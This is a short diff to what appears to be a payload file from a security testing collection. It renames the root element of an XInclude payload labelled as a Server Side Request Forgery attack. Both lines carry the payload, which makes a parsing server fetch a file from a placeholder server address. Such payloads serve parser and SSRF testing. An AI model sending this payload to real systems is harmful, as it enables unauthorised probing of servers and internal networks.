@@ -4,4 +4,4 @@
 name: XInclude URL Invocation
 description: Server Side Request Forgery Attack via XInclude
 -->
-<data xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://{server_address}/file.xml"></xi:include></data>
+<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://{server_address}/file.xml"></xi:include></root>
